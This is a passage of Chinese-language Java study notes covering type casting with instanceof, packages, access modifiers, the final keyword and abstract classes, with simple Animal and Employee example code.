<h4 id="引用类型转换"><a class="header-anchor" href="#引用类型转换">¶</a>引用类型转换</h4>
<ul>
<li>当使用多态方式调用方法时，首先检查父类中是否有该方法，如果没有，则编译错误</li>
<li>想要调用子类特有的方法，必须做向下转型</li>
<li>基本数据类型转换
<ul>
<li>自动转换: 范围小的赋值给范围大的.自动完成:double d = 5;</li>
<li>强制转换: 范围大的赋值给范围小的,强制转换:int i = (int)3.14</li>
</ul>
</li>
<li>多态的转型分为<strong>向上转型</strong>（自动转换）与<strong>向下转型</strong>（强制转换）两种</li>
</ul>
<h5 id="向上转型（自动转换）"><a class="header-anchor" href="#向上转型（自动转换）">¶</a>向上转型（自动转换）</h5>
<ul>
<li>当父类引用指向一个子类对象时，便是向上转型</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">父类类型  变量名 = <span class="keyword">new</span> 子类类型();</span><br><span class="line">如：<span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>原因</strong>
<ul>
<li><strong>父类类型相对与子类来说是大范围的类型，Animal是动物类，是父类类型。Cat是猫类，是子类类型。Animal类型的范围当然很大，包含一切动物。</strong></li>
<li>所以子类范围小可以直接自动转型给父类类型的变量</li>
</ul>
</li>
</ul>
<h5 id="向下转型（强制转换）"><a class="header-anchor" href="#向下转型（强制转换）">¶</a>向下转型（强制转换）</h5>
<ul>
<li>一个已经向上转型的子类对象，将父类引用转为子类引用，可以使用强制类型转换的格式，便是向下转型</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">子类类型 变量名 = (子类类型) 父类变量名;</span><br><span class="line">如:<span class="type">Aniaml</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">   <span class="type">Cat</span> <span class="variable">c</span> <span class="operator">=</span>(Cat) a;  </span><br></pre></td></tr></table></figure>
<h5 id="案例演示"><a class="header-anchor" href="#案例演示">¶</a>案例演示</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;    </span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;        </span><br><span class="line">        System.out.println(<span class="string">&quot;吃鱼&quot;</span>);    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchMouse</span><span class="params">()</span> &#123;        </span><br><span class="line">        System.out.println(<span class="string">&quot;抓老鼠&quot;</span>);    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;        </span><br><span class="line">        System.out.println(<span class="string">&quot;吃骨头&quot;</span>);    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">watchHouse</span><span class="params">()</span> &#123;        </span><br><span class="line">        System.out.println(<span class="string">&quot;看家&quot;</span>);    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 向上转型        </span></span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();        </span><br><span class="line">        a.eat();        <span class="comment">// 调用的是 Cat 的 eat</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向下转型        </span></span><br><span class="line">        <span class="type">Cat</span> <span class="variable">c</span> <span class="operator">=</span> (Cat)a;        </span><br><span class="line">        c.catchMouse();     <span class="comment">// 调用的是 Cat 的 catchMouse</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="转型的异常"><a class="header-anchor" href="#转型的异常">¶</a>转型的异常</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 向上转型        </span></span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();        </span><br><span class="line">        a.eat();               <span class="comment">// 调用的是 Cat 的 eat</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向下转型        </span></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> (Dog)a;        </span><br><span class="line">        d.watchHouse();        <span class="comment">// 调用的是 Dog 的 watchHouse 【运行报错】</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这段代码可以通过编译，但是运行时，却报出了 <code>ClassCastException</code> ，类型转换异常！</li>
<li>明明创建了Cat类型对象，运行时，当然不能转换成Dog对象的</li>
</ul>
<h5 id="instanceof关键字"><a class="header-anchor" href="#instanceof关键字">¶</a>instanceof关键字</h5>
<ul>
<li>为了避免ClassCastException的发生，Java提供了 <code>instanceof</code> 关键字，<strong>给引用变量做类型的校验</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">变量名 <span class="keyword">instanceof</span> 数据类型 </span><br><span class="line">如果变量属于该数据类型或者其子类类型，返回<span class="literal">true</span>。</span><br><span class="line">如果变量不属于该数据类型或者其子类类型，返回<span class="literal">false</span>。</span><br></pre></td></tr></table></figure>
<ul>
<li>用处：引用类型转换前，需要用<code>instanceof</code>做一个判断</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向上转型        </span></span><br><span class="line">      <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();        </span><br><span class="line">      a.eat();               <span class="comment">// 调用的是 Cat 的 eat</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 向下转型        </span></span><br><span class="line">      <span class="keyword">if</span> (a <span class="keyword">instanceof</span> Cat) &#123;</span><br><span class="line">          <span class="type">Cat</span> <span class="variable">c</span> <span class="operator">=</span> (Cat)a;            </span><br><span class="line">          c.catchMouse();        <span class="comment">// 调用的是 Cat 的 catchMouse</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a <span class="keyword">instanceof</span> Dog) &#123;</span><br><span class="line">          <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> (Dog)a;            </span><br><span class="line">          d.watchHouse();       <span class="comment">// 调用的是 Dog 的 watchHouse</span></span><br></pre></td></tr></table></figure>
<h5 id="instanceof新特性"><a class="header-anchor" href="#instanceof新特性">¶</a>instanceof新特性</h5>
<ul>
<li>JDK14的时候提出了新特性，把判断和强转合并成了一行</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新特性</span></span><br><span class="line"><span class="comment">//先判断a是否为Dog类型，如果是，则强转成Dog类型，转换之后变量名为d</span></span><br><span class="line"><span class="comment">//如果不是，则不强转，结果直接是false</span></span><br><span class="line"><span class="keyword">if</span>(a <span class="keyword">instanceof</span> Dog d) &#123;</span><br><span class="line">    d.lookHome();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(a <span class="keyword">instanceof</span> Cat c) &#123;</span><br><span class="line">    c.catchMouse();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;没有这个类型，无法转换&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="综合练习"><a class="header-anchor" href="#综合练习">¶</a>综合练习</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需求：</span><br><span class="line">1. 定义狗类</span><br><span class="line">属性：年龄，颜色</span><br><span class="line">        行为:</span><br><span class="line">          eat(String something)(something表示吃的东西)</span><br><span class="line">          看家lookHome方法(无参数)</span><br><span class="line">2. 定义猫类</span><br><span class="line">        属性：年龄，颜色</span><br><span class="line">        行为:</span><br><span class="line">          eat(String something)方法(something表示吃的东西)</span><br><span class="line">          逮老鼠catchMouse方法(无参数)</span><br><span class="line">3. 定义Person类//饲养员</span><br><span class="line">        属性：姓名，年龄</span><br><span class="line">        行为：</span><br><span class="line">          keepPet(Dog dog,String something)方法</span><br><span class="line">          功能：喂养宠物狗，something表示喂养的东西</span><br><span class="line">        行为：</span><br><span class="line">          keepPet(Cat cat,String something)方法</span><br><span class="line">          功能：喂养宠物猫，something表示喂养的东西</span><br><span class="line">                生成空参有参构造，set和get方法  </span><br><span class="line">4. 定义测试类(完成以下打印效果):</span><br><span class="line">        keepPet(Dog dog,String somethind)方法打印内容如下：</span><br><span class="line">                年龄为30岁的老王养了一只黑颜色的2岁的狗</span><br><span class="line">                2岁的黑颜色的狗两只前腿死死的抱住骨头猛吃</span><br><span class="line">        keepPet(Cat cat,String somethind)方法打印内容如下：</span><br><span class="line">                年龄为25岁的老李养了一只灰颜色的3岁的猫</span><br><span class="line">                3岁的灰颜色的猫眯着眼睛侧着头吃鱼</span><br><span class="line">5. 思考：        </span><br><span class="line">  - Dog和Cat都是Animal的子类，以上案例中针对不同的动物，定义了不同的keepPet方法，过于繁琐，能否简化，并体会简化后的好处？</span><br><span class="line">  - Dog和Cat虽然都是Animal的子类，但是都有其特有方法，能否想办法在keepPet中调用特有方法？</span><br><span class="line">6. 画图分析</span><br><span class="line">  - 基类Animal——子类1Dog</span><br><span class="line">  - 基类Animal——子类2Cat</span><br><span class="line">  - Person类</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 部分代码</span></span><br><span class="line"><span class="comment">// 以下是Person类部分代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 想要一个方法，能接收所有的动物，包括猫，包括狗</span></span><br><span class="line">    <span class="comment">// 方法的形参：可以写这些类的父类 Animal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keepPet</span><span class="params">(Animal a, String something)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(a <span class="keyword">instanceof</span> Dog d)&#123;  <span class="comment">// 运用的是instanceof的新特性，判断与类型强制转换同时进行</span></span><br><span class="line">            System.out.println(<span class="string">&quot;年龄为&quot;</span> + age + <span class="string">&quot;岁的&quot;</span> + name + <span class="string">&quot;养了一只&quot;</span> + d.getColor() + <span class="string">&quot;颜色的&quot;</span> + d.getAge() + <span class="string">&quot;岁的狗&quot;</span>);</span><br><span class="line">            d.eat(something);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a <span class="keyword">instanceof</span> Cat c)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;年龄为&quot;</span> + age + <span class="string">&quot;岁的&quot;</span> + name + <span class="string">&quot;养了一只&quot;</span> + c.getColor() + <span class="string">&quot;颜色的&quot;</span> + c.getAge() + <span class="string">&quot;岁的猫&quot;</span>);</span><br><span class="line">            c.eat(something);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;没有这种动物&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="包"><a class="header-anchor" href="#包">¶</a>包</h3>
<ul>
<li>包在操作系统中其实就是一个文件夹。<strong>包是用来分门别类的管理技术，不同的技术类放在不同的包下</strong>，方便管理和维护</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">路径名.路径名.xxx.xxx</span><br><span class="line"><span class="comment">// 例如：com.itheima.oa</span></span><br></pre></td></tr></table></figure>
<ul>
<li>包名一般是公司域名的倒写。例如：黑马是<a href="http://www.itheima.com">www.itheima.com</a>,包名就可以定义成com.itheima.技术名称。</li>
<li>包名必须用”.“连接。</li>
<li>包名的每个路径名必须是一个合法的标识符，而且不能是Java的关键字</li>
</ul>
<h4 id="导包"><a class="header-anchor" href="#导包">¶</a>导包</h4>
<ul>
<li>
<p>什么时候需要导包？</p>
<ul>
<li>情况一：在使用Java中提供的非核心包中的类时</li>
<li>情况二：使用自己写的其他包中的类时</li>
</ul>
</li>
<li>
<p>什么时候不需要导包？</p>
<ul>
<li>情况一：在使用Java核心包（java.lang）中的类时</li>
<li>情况二：在使用自己写的同一个包中的类时</li>
</ul>
</li>
</ul>
<h4 id="使用不同包下的相同类"><a class="header-anchor" href="#使用不同包下的相同类">¶</a>使用不同包下的相同类</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用全类名的形式即可。</span></span><br><span class="line"><span class="comment">//全类名：包名 + 类名</span></span><br><span class="line"><span class="comment">//拷贝全类名的快捷键：选中类名crtl + shift + alt + c 或者用鼠标点copy，再点击copy Reference</span></span><br><span class="line">com.itheima.homework.demo1.<span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.itheima.homework.demo1.Student();</span><br><span class="line">com.itheima.homework.demo2.<span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.itheima.homework.demo2.Student();</span><br></pre></td></tr></table></figure>
<h3 id="权限修饰符"><a class="header-anchor" href="#权限修饰符">¶</a>权限修饰符</h3>
<ul>
<li><code>public &gt; protected &gt; 默认 &gt; private</code></li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>public</th>
<th>protected</th>
<th>默认</th>
<th>private</th>
</tr>
</thead>
<tbody>
<tr>
<td>同一类中</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>同一包中的类</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
</tr>
<tr>
<td>不同包的子类</td>
<td>√</td>
<td>√</td>
<td></td>
<td></td>
</tr>
<tr>
<td>不同包中的无关类</td>
<td>√</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>编写代码时，如果没有特殊的考虑，建议这样使用权限：</p>
<ul>
<li>成员变量使用<code>private</code> ，隐藏细节。</li>
<li>构造方法使用<code>public</code> ，方便创建对象。</li>
<li>成员方法使用<code>public</code> ，方便调用方法。</li>
</ul>
<blockquote>
<p>小贴士：不加权限修饰符，就是默认权限</p>
</blockquote>
<h3 id="final关键字"><a class="header-anchor" href="#final关键字">¶</a>final关键字</h3>
<ul>
<li>
<p>子类可以在父类的基础上改写父类内容，比如方法重写。</p>
</li>
<li>
<p>有一个方法不想别人去改写里面内容→<code>final</code></p>
</li>
<li>
<p><code>final</code> 关键字，表示修饰的内容不可变。</p>
<ul>
<li><strong>final</strong>：  不可改变，最终的含义。可以用于修饰类、方法和变量。
<ul>
<li>类：被修饰的类，不能被继承。</li>
<li>方法：被修饰的方法，不能被重写。</li>
<li>变量：被修饰的变量，有且仅能被赋值一次。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="使用方式"><a class="header-anchor" href="#使用方式">¶</a>使用方式</h4>
<h5 id="修饰类"><a class="header-anchor" href="#修饰类">¶</a>修饰类</h5>
<ul>
<li>
<p>final修饰的类，不能被继承</p>
</li>
<li>
<pre><code class="language-java">final class 类名 &#123;
&#125;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 查询API发现像 `public final class String` 、`public final class Math` 、`public final class Scanner` 等，很多我们学习过的类，都是被final修饰的，目的就是供我们使用，而不让我们所以改变其内容</span><br><span class="line"></span><br><span class="line">##### 修饰方法</span><br><span class="line"></span><br><span class="line">- final修饰的方法，不能被重写</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">修饰符 final 返回值类型 方法名(参数列表)&#123;</span><br><span class="line">    //方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
<h5 id="修饰变量-局部变量"><a class="header-anchor" href="#修饰变量-局部变量">¶</a>修饰变量-局部变量</h5>
<h6 id="局部变量-基本类型"><a class="header-anchor" href="#局部变量-基本类型">¶</a>局部变量-基本类型</h6>
<ul>
<li>基本类型的局部变量，被final修饰后，只能赋值一次，不能再更改</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法1</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    c = i;</span><br><span class="line">    <span class="comment">// 报错</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 写法2</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> i;</span><br><span class="line">    <span class="comment">// 不报错，因为每次循环都是一次新的变量c</span></span><br></pre></td></tr></table></figure>
<h5 id="修饰变量-成员变量"><a class="header-anchor" href="#修饰变量-成员变量">¶</a>修饰变量-成员变量</h5>
<ul>
<li>成员变量涉及到初始化的问题，初始化方式有显示初始化和构造方法初始化，只能选择其中一个</li>
<li>显示初始化(在定义成员变量的时候立马赋值)（常用）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>构造方法初始化(在构造方法中赋值一次)（不常用，了解即可）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注意：每个构造方法中都要赋值一次</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> num2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num2 = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//     this.num2 = 20;</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num2 = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//     this.num2 = 20;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 啥意思没搞懂= = </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>被final修饰的常量名称，一般都有书写规范，所有字母都<strong>大写</strong>。</p>
</blockquote>
<h2 id="Day15-面向对象进阶（抽象类-接口-内部类）"><a class="header-anchor" href="#Day15-面向对象进阶（抽象类-接口-内部类）">¶</a>Day15 面向对象进阶（抽象类&amp;接口&amp;内部类）</h2>
<ul>
<li>能够写出抽象类的格式</li>
<li>能够写出抽象方法的格式</li>
<li>能说出抽象类的应用场景</li>
<li>写出定义接口的格式</li>
<li>写出实现接口的格式</li>
<li>说出接口中成员的特点</li>
<li>能说出接口的应用场景</li>
<li>能说出接口中为什么会出现带有方法体的方法</li>
<li>能完成适配器设计模式</li>
</ul>
<h3 id="抽象类"><a class="header-anchor" href="#抽象类">¶</a>抽象类</h3>
<ul>
<li>
<p>父类可能知道子类应该有哪个功能，但是功能具体怎么实现父类是不清楚的（由子类自己决定），父类只需要提供一个没有方法体的定义即可，具体实现交给子类自己去实现</p>
</li>
<li>
<p><strong>把没有方法体的方法称为抽象方法</strong></p>
</li>
<li>
<p><strong>Java语法规定，包含抽象方法的类就是抽象类</strong>。</p>
<ul>
<li><strong>抽象方法</strong> ： 没有方法体的方法。</li>
<li><strong>抽象类</strong>：包含抽象方法的类</li>
</ul>
</li>
</ul>
<h4 id="abstract使用"><a class="header-anchor" href="#abstract使用">¶</a>abstract使用</h4>
<h5 id="抽象方法"><a class="header-anchor" href="#抽象方法">¶</a>抽象方法</h5>
<ul>
<li>抽象方法只包含一个方法名，而没有方法体</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 <span class="keyword">abstract</span> 返回值类型 方法名 (参数列表);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>；</span><br></pre></td></tr></table></figure>
<h5 id="抽象类-v2"><a class="header-anchor" href="#抽象类-v2">¶</a>抽象类</h5>
<ul>
<li>如果一个类包含抽象方法，那么该类必须是抽象类。【才知道= =】</li>
<li><strong>注意：抽象类不一定有抽象方法，但是有抽象方法的类必须定义成抽象类</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> class 类名字 &#123; </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="抽象类的使用"><a class="header-anchor" href="#抽象类的使用">¶</a>抽象类的使用</h5>
<ul>
<li><strong>要求</strong>：继承抽象类的子类<strong>必须重写父类所有的抽象方法</strong>。</li>
<li>否则，该子类也必须声明为抽象类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父类,抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String id;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(String id, String name, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.salary = salary;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 抽象方法</span></span><br><span class="line">  <span class="comment">// 抽象方法必须要放在抽象类中</span></span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个子类继承抽象类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span> <span class="keyword">extends</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Manager</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Manager</span><span class="params">(String id, String name, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(id, name, salary);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 2.重写父类的抽象方法</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;管理其他人&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个子类继承抽象类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cook</span> <span class="keyword">extends</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Cook</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Cook</span><span class="params">(String id, String name, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(id, name, salary);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;厨师炒菜多加点盐...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo10</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建抽象类,抽象类不能创建对象</span></span><br><span class="line">    <span class="comment">// 假设抽象类让我们创建对象,里面的抽象方法没有方法体,无法执行.所以不让我们创建对象</span></span><br><span class="line"><span class="comment">//    Employee e = new Employee();</span></span><br><span class="line"><span class="comment">//    e.work();</span></span><br><span class="line">    <span class="comment">// 3.创建子类</span></span><br><span class="line">    <span class="type">Manager</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Manager</span>();</span><br><span class="line">    m.work();</span><br><span class="line">    <span class="type">Cook</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cook</span>(<span class="string">&quot;ap002&quot;</span>, <span class="string">&quot;库克&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    c.work();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>此时的方法重写，是子类对父类抽象方法的完成实现，我们将这种方法重写的操作，也叫做<strong>实现方法</strong></li>
</ul>
<h4 id="抽象类的特征"><a class="header-anchor" href="#抽象类的特征">¶</a>抽象类的特征</h4>
<ul>
<li>
<p>总结起来可以说是 <strong>有得有失</strong></p>
<ul>
<li>
<p><strong>有得：抽象类得到了拥有抽象方法的能力。</strong></p>
</li>
<li>
<p><strong>有失：抽象类失去了创建对象的能力。</strong></p>
</li>
<li>
<p>其他成员（构造方法，实例方法，静态方法等）抽象类都是具备的</p>
</li>
</ul>
</li>
</ul>
<h4 id="抽象类的细节"><a class="header-anchor" href="#抽象类的细节">¶</a>抽象类的细节</h4>
<ul>
<li>
<p>不需要背，只要当idea报错之后，知道如何修改即可</p>
</li>
<li>
<p>理解抽象的本质，无需死记硬背</p>
</li>
</ul>
<ol>
<li>抽象类<strong>不能创建对象</strong>，如果创建，编译无法通过而报错。只能创建其非抽象子类的对象。</li>
</ol>
<blockquote>
<p>理解：假设创建了抽象类的对象，调用抽象的方法，而抽象方法没有具体的方法体，没有意义。</p>
</blockquote>
<ol start="2">
<li>抽象类中，可以有构造方法，是供子类创建对象时，初始化父类成员使用的。</li>
</ol>
<blockquote>
<p>理解：子类的构造方法中，有默认的super()，需要访问父类构造方法。</p>
</blockquote>
<ol start="3">
<li>抽象类中，不一定包含抽象方法，但是有抽象方法的类必定是抽象类。</li>
</ol>
<blockquote>
<p>理解：未包含抽象方法的抽象类，目的就是不想让调用者创建该类对象，通常用于某些特殊的类结构设计。</p>
</blockquote>
<ol start="4">
<li>抽象类的子类，必须重写抽象父类中<strong>所有的</strong>抽象方法，否则子类也必须定义成抽象类，编译无法通过而报错。</li>
</ol>
<blockquote>
<p>理解：假设不重写所有抽象方法，则类中可能包含抽象方法。那么创建对象后，调用抽象的方法，没有意义。</p>
</blockquote>
<ol start="5">
<li><strong>抽象类存在的意义是为了被子类继承</strong>。</li>
</ol>
<blockquote>
<p>理解：抽象类中已经实现的是模板中确定的成员，抽象类不确定如何实现的定义成抽象方法，交给具体的子类去实现。</p>
</blockquote>
<h4 id="抽象类存在的意义"><a class="header-anchor" href="#抽象类存在的意义">¶</a>抽象类存在的意义</h4>
<ul>
<li>抽象类存在的意义是为了被子类继承，否则抽象类将毫无意义</li>
<li>抽象类可以强制让子类，一定要按照规定的格式进行重写</li>
</ul>
<h3 id="接口"><a class="header-anchor" href="#接口">¶</a>接口</h3>
<ul>
<li>接口中全部是抽象方法</li>
